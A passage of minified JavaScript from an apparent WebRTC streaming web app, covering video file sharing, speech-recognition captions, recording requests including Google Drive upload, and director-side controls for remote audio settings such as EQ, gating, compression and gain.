container=document.createElement("div");container.id="container_host",getById("gridlayout").appendChild(container),session.cover&&container.style.setProperty("height","100%","important"),!1!==session.roomid?(""!==session.roomid||session.view&&""!==session.view)&&(log("ROOMID EANBLED"),getById("head3").classList.add("hidden"),getById("head3a").classList.add("hidden"),joinRoom(session.roomid)):(getById("head3").classList.remove("hidden"),getById("head3a").classList.remove("hidden"),getById("logoname").style.display="none"),getById("head1").className="hidden",updatePushId(),getById("head1").className="hidden",getById("head2").className="hidden",session.cleanOutput?getById("controlButtons").classList.add("hidden"):(getById("chatbutton").className="float",getById("sharefilebutton").classList.remove("hidden"),getById("hangupbutton").className="float",getById("controlButtons").classList.remove("hidden"),getById("helpbutton").style.display="inherit",getById("reportbutton").style.display=""),updateReshareLink(),pokeIframeAPI("file-share",!0),pokeIframeAPI("started-fileshare"),clearInterval(session.updateLocalStatsInterval),session.updateLocalStatsInterval=setInterval((function(){updateLocalStats()}),session.statsInterval),session.seeding=!0,session.seedStream()},session.changePublishFile=function(ele,event){log("FILE VIDEO STREAM CHANGE");for(var files=[],i=0;i<ele.files.length;i++)files.push(ele.files[i]);var vid=getById("videosource");vid.playlist=files,nextFilePlaylist(vid)},session.publishFile=function(ele,event){log("FILE STREAM SETUP"),session.transcript&&setTimeout((function(){setupClosedCaptions()}),1e3);for(var files=[],i=0;i<ele.files.length;i++)files.push(ele.files[i]);log(files);var fileURL=URL.createObjectURL(files[0]),container=document.createElement("div");container.id="container",session.cover&&container.style.setProperty("height","100%","important");var v=createVideoElement();v.container=container,session.cleanOutput&&(container.style.height="100%",v.style.maxWidth="100%",v.style.boxShadow="none"),session.streamID&&(v.dataset.sid=session.streamID),getById("gridlayout").appendChild(container),!1!==session.roomid?(""!==session.roomid||session.view&&""!==session.view)&&(log("ROOMID EANBLED"),log("Update Mixer Event on REsize SET"),getById("head3").classList.add("hidden"),getById("head3a").classList.add("hidden"),joinRoom(session.roomid)):(getById("head3").classList.remove("hidden"),getById("head3a").classList.remove("hidden"),getById("logoname").style.display="none"),getById("head1").className="hidden",updatePushId(),getById("head1").className="hidden",getById("head2").className="hidden",session.cleanOutput?getById("controlButtons").classList.add("hidden"):(getById("chatbutton").className="float",getById("sharefilebutton").classList.remove("hidden"),getById("hangupbutton").className="float",getById("controlButtons").classList.remove("hidden"),getById("helpbutton").style.display="inherit",getById("reportbutton").style.display="");var bigPlayButton=document.getElementById("bigPlayButton");bigPlayButton&&bigPlayButton.parentNode.removeChild(bigPlayButton),v.autoplay=!1,null!==session.showControls?v.controls=session.showControls:v.controls=!0,v.muted=!1,1==files.length?v.loop=!0:v.loop=!1,v.setAttribute("playsinline",""),v.src=fileURL;try{session.streamSrc=Firefox?v.mozCaptureStream():v.captureStream(),toggleMute(!0)}catch(e){return void errorlog(e)}v.id="videosource",v.dataset.menu="context-menu-video",v.playlist=files,v.addEventListener("ended",(function myHandler(e){log("MY HANDLER TRIGGERED"),nextFilePlaylist(getById("videosource"))}),!1),v.className="tile clean fileshare",session.videoElement=v,container.appendChild(v),session.mirrorExclude=!0,session.director||!1!==session.scene||(!1!==session.roomid?(""===session.roomid?session.view&&""!==session.view?(session.windowed=!1,play()):(session.fullscreen?session.windowed=!1:(v.className="myVideo clean fileshare",container.classList.add("vidcon"),session.windowed=!0),getById("mutespeakerbutton").classList.add("hidden"),container.style.width="100%",container.style.alignItems="center",container.backgroundColor="#666",play()):(5==session.stereo&&(session.stereo=3),session.windowed=!1),applyMirror(session.mirrorExclude)):(session.fullscreen?session.windowed=!1:(v.className="myVideo clean fileshare",container.classList.add("vidcon"),session.windowed=!0),getById("mutespeakerbutton").classList.add("hidden"),container.style.width="100%",container.style.alignItems="center",container.backgroundColor="#666",applyMirror(session.mirrorExclude))),v.addEventListener("click",(function(e){log("click");try{if(e.ctrlKey||e.metaKey){e.preventDefault();var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu),e.stopPropagation(),!1}}catch(e){errorlog(e)}})),v.touchTimeOut=null,v.touchLastTap=0,v.touchCount=0,v.addEventListener("touchend",(function(event){if(!session.disableMouseEvents){log("touched"),document.onmousemove=null,document.ontouchmove=null;var currentTime=(new Date).getTime(),tapLength=currentTime-v.touchLastTap;if(clearTimeout(v.touchTimeOut),tapLength<500&&tapLength>0){if(log("double touched"),v.touchCount+=1,event.preventDefault(),v.touchCount<5)return v.touchLastTap=currentTime,!1;v.touchLastTap=0,v.touchCount=0;var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu),event.stopPropagation(),!1}v.touchCount=1,v.touchTimeOut=setTimeout((function(vv){clearTimeout(vv.touchTimeOut),vv.touchLastTap=0,vv.touchCount=0}),5e3,v),v.touchLastTap=currentTime}})),updateReshareLink(),pokeIframeAPI("started-fileshare"),pokeIframeAPI("file-share",!0),clearInterval(session.updateLocalStatsInterval),session.updateLocalStatsInterval=setInterval((function(){updateLocalStats()}),session.statsInterval),session.seeding=!0,session.videoMutedFlag&&(session.videoMuted=!0,toggleVideoMute(!0)),session.seedStream()};var Final_transcript="",Interim_transcript="",Recognition=null;if("webkitSpeechRecognition"in window)var SpeechRecognition=webkitSpeechRecognition;else if("SpeechRecognition"in window)SpeechRecognition=window.SpeechRecognition;else SpeechRecognition=!1;var TranscriptionCounter=0,retriesRecognition=0,activeRecognition=!1,timeoutRecognition=null;function setupClosedCaptions(){activeRecognition||(activeRecognition=!0,log("CLOSED CAPTIONING SETUP"),SpeechRecognition?((Recognition=new SpeechRecognition).lang=session.transcript,Recognition.continuous=!0,Recognition.interimResults=!0,Recognition.maxAlternatives=0,Recognition.onstart=function(){log("started transcription: "+Date.now()),clearTimeout(timeoutRecognition),timeoutRecognition=setTimeout((function(){retriesRecognition=0}),1e4)},Recognition.onerror=function(event){retriesRecognition<=3&&console.error(event),errorlog(event)},Recognition.onend=function(e){warnlog(e),log("Stopped transcription "+Date.now()),clearTimeout(timeoutRecognition),timeoutRecognition=setTimeout((function(){Recognition.start()}),parseInt(500*retriesRecognition*retriesRecognition)),3==(retriesRecognition+=1)&&console.error("Captioning service is having a problem connecting")},Recognition.onresult=function(event){if(Interim_transcript="",void 0!==event.results){for(var i=event.resultIndex;i<event.results.length;++i)event.results[i].isFinal?Final_transcript+=event.results[i][0].transcript:Interim_transcript+=event.results[i][0].transcript;if(Final_transcript.length>0){log("FINAL:"+Final_transcript);try{(data={isFinal:!0}).transcript=Final_transcript,data.counter=TranscriptionCounter,session.sendMessage(data),TranscriptionCounter+=1,Interim_transcript="",pokeIframeAPI("transcription-text",Final_transcript="")}catch(e){errorlog(e)}}else try{var data;(data={isFinal:!1}).transcript=Interim_transcript,data.counter=TranscriptionCounter,session.sendMessage(data)}catch(e){errorlog(e),Interim_transcript=""}}else log(event)},Recognition.start()):session.cleanOutput||warnUser(getTranslation("speech-not-suppoted"),!1,!1))}async function requestGoogleDriveRecord(ele,state=null,bitrate=null){var UUID=ele.dataset.UUID||null,filename=UUID;if(session.rpcs[UUID]&&(filename=session.rpcs[UUID].label||session.rpcs[UUID].streamID||UUID),filename=(filename=filename.replace(/[\W]+/g,"_")).substring(0,55),filename+="_"+Date.now().toString(),(!session.gdrive||!session.gdrive.accessToken)&&(session.gdrive=setupGoogleDriveUploader(),session.gdrive.promise)){console.log("AWAITING PROMISE");try{await session.gdrive.promise}catch(e){return}}log("PROMISE DONE");var uploadLink=await session.gdrive.startResumableUpload(filename);if(!state&&ele.classList.contains("pressed"))(msg={requestVideoRecord:!1,googleDriveRecord:!1}).UUID=UUID,session.sendRequest(msg,msg.UUID),ele.classList.remove("pressed"),ele.ariaPressed="false";else if(null==state||state){var msg;(msg={requestVideoRecord:!0}).googleDriveRecord=uploadLink,msg.UUID=UUID,null===bitrate&&(window.focus(),bitrate=await promptAlt(getTranslation("what-bitrate"),!1,!1,6e3)),bitrate&&(msg.value=bitrate,session.sendRequest(msg,msg.UUID),ele.classList.add("pressed"),ele.ariaPressed="true")}pokeIframeAPI("request-video-record",msg.requestVideoRecord,UUID)}async function requestVideoRecord(ele,state=null,bitrate=null){var UUID=ele.dataset.UUID||null;if(!state&&ele.classList.contains("pressed"))(msg={requestVideoRecord:!1}).UUID=UUID,session.sendRequest(msg,msg.UUID),ele.classList.remove("pressed"),ele.ariaPressed="false";else if(null==state||state){var msg;(msg={requestVideoRecord:!0}).UUID=UUID,null===bitrate&&(window.focus(),bitrate=await promptAlt(getTranslation("what-bitrate"),!1,!1,6e3)),bitrate&&(msg.value=bitrate,session.sendRequest(msg,msg.UUID),ele.classList.add("pressed"),ele.ariaPressed="true")}pokeIframeAPI("request-video-record",msg.requestVideoRecord,UUID)}function changeOrderDirector(value){0==session.order&&(session.order=0),session.order+=parseInt(value)||0;var elements=document.querySelectorAll('[data-action-type="order-value-director"]');elements[0]&&(elements[0].innerText=parseInt(session.order)||0);var data={};(data={}).order=session.order,session.sendPeers(data),pokeIframeAPI("director-order",data.order)}function changeOrder(value,UUID){var msg={};msg.changeOrder=value,msg.UUID=UUID,session.sendRequest(msg,msg.UUID),pokeIframeAPI("change-order",value,UUID)}function requestVideoHack(keyname,value,UUID,ctrl=!1){var msg={requestVideoHack:!0};msg.keyname=keyname,msg.value=value,msg.UUID=UUID,msg.ctrl=ctrl,session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-video-setting",{value:value,keyname:keyname,ctrl:ctrl},UUID)}function requestAudioHack(keyname,value,UUID,deviceId="default"){var msg={requestAudioHack:!0};msg.keyname=keyname,msg.value=value,msg.UUID=UUID,msg.deviceId=deviceId,session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-audio-setting",{value:value,keyname:keyname,deviceId:deviceId},UUID)}function requestChangeEQ(keyname,value,UUID,track=0){var msg={requestChangeEQ:!0};msg.keyname=keyname,msg.value=value,msg.UUID=UUID,msg.track=track,session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-change-eq",{value:value,keyname:keyname,track:track},UUID)}function requestChangeGating(keyname,value,UUID,track=0){var msg={requestChangeGating:!0};msg.keyname=keyname,msg.value=value,msg.UUID=UUID,msg.track=track,session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-change-gating",{value:value,keyname:keyname,track:track},UUID)}function requestChangeCompressor(keyname,value,UUID,track=0){var msg={requestChangeCompressor:!0};msg.keyname=keyname,msg.value=value,msg.UUID=UUID,msg.track=track,session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-change-compressor",{value:value,keyname:keyname,track:track},UUID)}function requestChangeMicDelay(value,UUID,track=0){var msg={requestChangeMicDelay:!0};msg.value=value,msg.UUID=UUID,msg.track=track,session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-change-mic-delay",{value:value,track:track},UUID)}function requestChangeSubGain(value,UUID,deviceId){var msg={requestChangeSubGain:!0};msg.value=value,msg.UUID=UUID,msg.deviceId=deviceId,log(msg),session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-sub-gain",{value:value,deviceId:deviceId},UUID)}function requestChangeLowcut(value,UUID,track=0){var msg={requestChangeLowcut:!0};msg.value=value,msg.UUID=UUID,msg.track=track,session.sendRequest(msg,msg.UUID),pokeIframeAPI("request-low-cut",value,UUID)}function toggleSystemPip(vid){try{vid.webkitSupportsPresentationMode&&"function"==typeof vid.webkitSetPresentationMode?vid.webkitSetPresentationMode("picture-in-picture"===vid.webkitPresentationMode?"inline":"picture-in-picture"):document.pictureInPictureElemen?(document.exitPictureInPicture(),vid.requestPictureInPicture()):vid.requestPictureInPicture()}catch(e){errorlog(e)}}function updateDirectorsAudio(dataN,UUID){var audioEle=document.createElement("div");if(query("#container_"+UUID+" .advancedAudioSettings").innerHTML="",query("#container_"+UUID+" .advancedAudioSettings").classList.remove("hidden"),dataN.length){for(var n=0;n<dataN.length;n+=1){var data=dataN[n];if(1==dataN.length)if(data.trackLabel)(label=document.createElement("label")).innerText=data.trackLabel,label.style.display="block",label.id="remoteAudioLabel_"+UUID,label.classList.add("settingsLabel"),label.dataset.UUID=UUID,audioEle.appendChild(label);if("micDelay"in data&&0==n){var label=document.createElement("label"),i="micDelay",div=document.createElement("div");label.id="label_"+i+"_"+UUID,label.htmlFor="constraints_"+i+"_"+UUID,(input=document.createElement("input")).min=0,input.max=500,input.value=data.micDelay||0,input.title="Previously was: "+input.value,input.type="range",input.dataset.keyname=i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+" (ms):",(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="constraints_manual_"+i+"_"+UUID,manualInput.dataset.UUID=UUID,manualInput.dataset.track=n,input.dataset.track=n,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+UUID,input.style="display:block; width:100%;",input.name="constraints_"+i,input.style.margin="2px 0px 5px",manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeMicDelay(parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.onchange=function(e){getById("constraints_manual_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeMicDelay(parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.oninput=function(e){getById("constraints_manual_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),requestChangeMicDelay(parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track)))},audioEle.appendChild(div),div.appendChild(label),div.appendChild(manualInput),audioEle.appendChild(input)}if(!1!==data.lowcut&&0==n){i="lowCut";(label=document.createElement("label")).id="label_"+i+"_"+UUID,label.htmlFor="constraints_"+i+"_"+UUID,(input=document.createElement("input")).min=50,input.max=150,input.value=data.lowcut,input.title="Previously was: "+input.value,input.type="range",input.dataset.keyname=i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="constraints_manual_"+i+"_"+UUID,manualInput.dataset.UUID=UUID,manualInput.dataset.track=n,input.dataset.track=n,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+UUID,input.style="display:block; width:100%;",input.name="constraints_"+i,input.style.margin="2px 0px 5px",manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeLowcut(parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.onchange=function(e){getById("constraints_manual_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeLowcut(parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.oninput=function(e){getById("constraints_manual_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),requestChangeLowcut(parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track)))},audioEle.appendChild(label),audioEle.appendChild(manualInput),audioEle.appendChild(input)}if(data.equalizer&&0==n){i="Low_EQ";(label=document.createElement("label")).htmlFor="constraints_"+i+"_"+UUID,(input=document.createElement("input")).min=-50,input.max=50,input.value=data.lowEQ,input.title="Previously was: "+input.value,input.type="range",input.dataset.keyname=i,input.dataset.labelname="low EQ:",label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i+"_"+UUID,manualInput.dataset.UUID=UUID,manualInput.dataset.track=n,input.dataset.track=n,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+UUID,input.style="display:block; width:100%;",input.name="constraints_"+i,input.style.margin="2px 0px 5px",manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeEQ("low",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.onchange=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeEQ("low",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.oninput=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),requestChangeEQ("low",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track)))},audioEle.appendChild(label),audioEle.appendChild(manualInput),audioEle.appendChild(input);i="midEQ";(label=document.createElement("label")).htmlFor="constraints_"+i+"_"+UUID,(input=document.createElement("input")).min=-50,input.max=50,input.value=data.midEQ,input.title="Previously was: "+input.value,input.type="range",input.dataset.keyname=i,input.dataset.labelname="mid EQ:",label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i+"_"+UUID,manualInput.dataset.UUID=UUID,manualInput.dataset.track=n,input.dataset.track=n,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+UUID,input.style="display:block; width:100%;",input.name="constraints_"+i,input.style.margin="2px 0px 5px",manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeEQ("mid",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.onchange=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeEQ("mid",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.oninput=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),requestChangeEQ("mid",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track)))},audioEle.appendChild(label),audioEle.appendChild(manualInput),audioEle.appendChild(input);i="highEQ";(label=document.createElement("label")).htmlFor="constraints_"+i+"_"+UUID,(input=document.createElement("input")).min=-50,input.max=50,input.value=data.highEQ,input.title="Previously was: "+input.value,input.type="range",input.dataset.keyname=i,input.dataset.labelname="high EQ:",label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i+"_"+UUID,manualInput.dataset.UUID=UUID,manualInput.dataset.track=n,input.dataset.track=n,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+UUID,input.classList.add("inputConstraint"),input.name="constraints_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeEQ("high",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.onchange=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeEQ("high",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track))},input.oninput=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),requestChangeEQ("high",parseInt(e.target.value),e.target.dataset.UUID,parseInt(e.target.dataset.track)))},audioEle.appendChild(label),audioEle.appendChild(manualInput),audioEle.appendChild(input)}if("gating"in data&&0==n){var label=document.createElement("label");i="noiseGate",div=document.createElement("div");(label=document.createElement("label")).id="label_"+i+"_"+n+"_"+UUID,label.htmlFor="constraints_"+i+"_"+n+"_"+UUID,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block; padding:0;",label.dataset.keyname=i,label.dataset.track=n;var input=document.createElement("select"),opt=(document.createElement("option"),new Option("Off",!1));input.options.add(opt),opt=new Option("On",!0),input.options.add(opt),data.gating&&(opt.selected="true"),input.dataset.deviceId=data.deviceId,input.id="constraints_"+i+"_"+n+"_"+UUID,input.className="constraintCameraInput",input.name="constraints_"+i+"_"+n,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.track=n,input.dataset.UUID=UUID,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,requestChangeGating("gating",e.target.value,e.target.dataset.UUID,parseInt(e.target.dataset.track)),log(e.target.dataset.keyname,e.target.value)},audioEle.appendChild(div),div.appendChild(label),div.appendChild(input)}if("compressor"in data&&0==n){label=document.createElement("label"),i="compressor",div=document.createElement("div");(label=document.createElement("label")).id="label_"+i+"_"+n+"_"+UUID,label.htmlFor="constraints_"+i+"_"+n+"_"+UUID,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block; padding:0;",label.dataset.keyname=i,label.dataset.track=n;input=document.createElement("select"),document.createElement("option"),opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",1),input.options.add(opt),1==data.compressor&&(opt.selected="true"),opt=new Option("Limiter",2),input.options.add(opt),2==data.compressor&&(opt.selected="true"),input.dataset.deviceId=data.deviceId,input.id="constraints_"+i+"_"+n+"_"+UUID,input.className="constraintCameraInput",input.name="constraints_"+i+"_"+n,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.track=n,input.dataset.UUID=UUID,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,requestChangeCompressor("compressor",e.target.value,e.target.dataset.UUID,parseInt(e.target.dataset.track)),log(e.target.dataset.keyname,e.target.value)},audioEle.appendChild(div),div.appendChild(label),div.appendChild(input)}if(dataN.length>1)if(data.trackLabel)(label=document.createElement("label")).innerText=data.trackLabel,label.style.display="block",label.id="remoteAudioLabel_"+UUID+"_"+n+"_"+UUID,label.classList.add("settingsLabel"),audioEle.appendChild(label);for(var i in warnlog(data),data.audioConstraints)try{if(log(i),log(data.audioConstraints[i]),"object"==typeof data.audioConstraints[i]&&null!==data.audioConstraints[i]&&"max"in data.audioConstraints[i]&&"min"in data.audioConstraints[i]){if("aspectRatio"===i)continue;if("width"===i)continue;if("height"===i)continue;if("frameRate"===i)continue;if("latency"===i);else{if("sampleRate"===i)continue;if("channelCount"===i);else if("volume"===i)continue}if(!("deviceId"in data.audioConstraints))continue;if((label=document.createElement("label")).htmlFor="constraints_"+i+"_"+n+"_"+UUID,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(input=document.createElement("input")).min=data.audioConstraints[i].min,input.max=data.audioConstraints[i].max,parseFloat(input.min)==parseFloat(input.max))continue;(manualInput=document.createElement("input")).type="number","step"in data.audioConstraints[i]?(input.step=data.audioConstraints[i].step,manualInput.step=data.audioConstraints[i].step):"volume"==i&&(input.step=.01,manualInput.step=.01),manualInput.dataset.keyname=i,manualInput.className="manualInput",manualInput.id="label_"+i+"_"+n+"_"+UUID,manualInput.max=data.audioConstraints[i].max,manualInput.min=data.audioConstraints[i].min,manualInput.dataset.UUID=UUID,manualInput.dataset.track=n,manualInput.dataset.keyname=i,i in data.currentAudioConstraints?(input.value=data.currentAudioConstraints[i],manualInput.value=parseFloat(input.value),label.title="Previously was:  "+data.currentAudioConstraints[i],input.title="Previously was:  "+data.currentAudioConstraints[i]):label.innerText=i,"height"!==i&&"width"!==i||(input.title="Hold CTRL (or cmd) to lock width and height together when changing them",input.min=16),input.type="range",input.dataset.keyname=i,input.dataset.track=n,input.dataset.deviceId=data.deviceId,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+n+"_"+UUID,input.style="display:block; width:100%;",input.name="constraints_"+i+"_"+n+"_"+UUID,"channelCount"==i&&(input.style.display="none",manualInput.style.margin="5px 0px 9px 10px"),manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.track+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,e.target.dataset.deviceId)},input.onchange=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.track+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,e.target.dataset.deviceId)},audioEle.appendChild(label),audioEle.appendChild(manualInput),audioEle.appendChild(input)}else if("object"==typeof data.audioConstraints[i]&&null!==data.audioConstraints[i]){if("resizeMode"==i)continue;div=document.createElement("div");(label=document.createElement("label")).id="label_"+i+"_"+n+"_"+UUID,label.htmlFor="constraints_"+i+"_"+n+"_"+UUID,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block; padding:0;";input=document.createElement("select"),document.createElement("option");if(data.audioConstraints[i].length>1)for(var opts in data.audioConstraints[i]){if(log(opts),!1===data.audioConstraints[i][opts])opt=new Option("Off",data.audioConstraints[i][opts]);else if(!0===data.audioConstraints[i][opts])opt=new Option("On",data.audioConstraints[i][opts]);else opt=new Option(data.audioConstraints[i][opts],data.audioConstraints[i][opts]);input.options.add(opt),i in data.currentAudioConstraints&&data.audioConstraints[i][opts]==data.currentAudioConstraints[i]&&(opt.selected="true")}else{if("torch"!=i.toLowerCase)continue;opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),input.options.add(opt);try{i in data.currentAudioConstraints&&1==data.audioConstraints[i].torch&&(opt.selected="true")}catch(e){}}input.id="constraints_"+i+"_"+n+"_"+UUID,input.className="constraintCameraInput",input.name=input.id,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.track=n,input.dataset.deviceId=data.deviceId,input.dataset.UUID=UUID,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,requestAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,e.target.dataset.deviceId),log(e.target.dataset.keyname,e.target.value)},audioEle.appendChild(div),div.appendChild(label),div.appendChild(input)}else if("boolean"==typeof data.audioConstraints[i]){div=document.createElement("div");(label=document.createElement("label")).id="label_"+i+"_"+n+"_"+UUID,label.htmlFor="constraints_"+i+"_"+n+"_"+UUID,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block; padding:0;",label.dataset.keyname=i,label.dataset.track=n;input=document.createElement("select"),document.createElement("option"),opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),input.options.add(opt);try{!0===data.audioConstraints[i]&&(opt.selected="true")}catch(e){}input.dataset.deviceId=data.deviceId,input.id="constraints_"+i+"_"+n+"_"+UUID,input.className="constraintCameraInput",input.name=input.id,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.track=n,input.dataset.UUID=UUID,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,requestAudioHack(e.target.dataset.keyname,e.target.value,e.target.dataset.UUID,e.target.dataset.deviceId),log(e.target.dataset.keyname,e.target.value)},audioEle.appendChild(div),div.appendChild(label),div.appendChild(input)}}catch(e){errorlog(e)}if(!1!==data.subGain){var manualInput;label=document.createElement("label"),i="Gain",div=document.createElement("div");label.id="label_"+i+"_"+n+"_"+UUID,label.htmlFor="constraints_"+i+"_"+n+"_"+UUID,(input=document.createElement("input")).min=0,input.max=200,input.value=100*data.subGain,input.title="Previously was: "+parseInt(input.value),input.type="range",input.dataset.keyname=i,input.dataset.track=n,input.dataset.labelname="Gain:",label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i+"_"+n+"_"+UUID,manualInput.dataset.UUID=UUID,manualInput.dataset.track=n,input.dataset.track=data.deviceId,input.dataset.UUID=UUID,input.id="constraints_"+i+"_"+n+"_"+UUID,input.style="display:block; width:100%;",input.name=input.id,input.style.margin="2px 0px 5px",manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname+"_"+e.target.dataset.track+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeSubGain(parseInt(e.target.value),e.target.dataset.UUID,e.target.dataset.track)},input.onchange=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.track+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),requestChangeSubGain(parseInt(e.target.value),e.target.dataset.UUID,e.target.dataset.track)},input.oninput=function(e){getById("label_"+e.target.dataset.keyname+"_"+e.target.dataset.track+"_"+e.target.dataset.UUID).value=parseFloat(e.target.value),Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),requestChangeSubGain(parseInt(e.target.value),e.target.dataset.UUID,e.target.dataset.track))},audioEle.appendChild(div),div.appendChild(label),div.appendChild(manualInput),audioEle.appendChild(input)}query("#container_"+UUID+" .advancedAudioSettings").appendChild(audioEle)}fixScrollReset&&(clearTimeout(fixScrollReset),fixScrollReset=null,getById("directorlayout").scrollTop=fixScrollResetValue)}}var remoteSliderTimeout=0;function updateDirectorsVideo(data,UUID){var 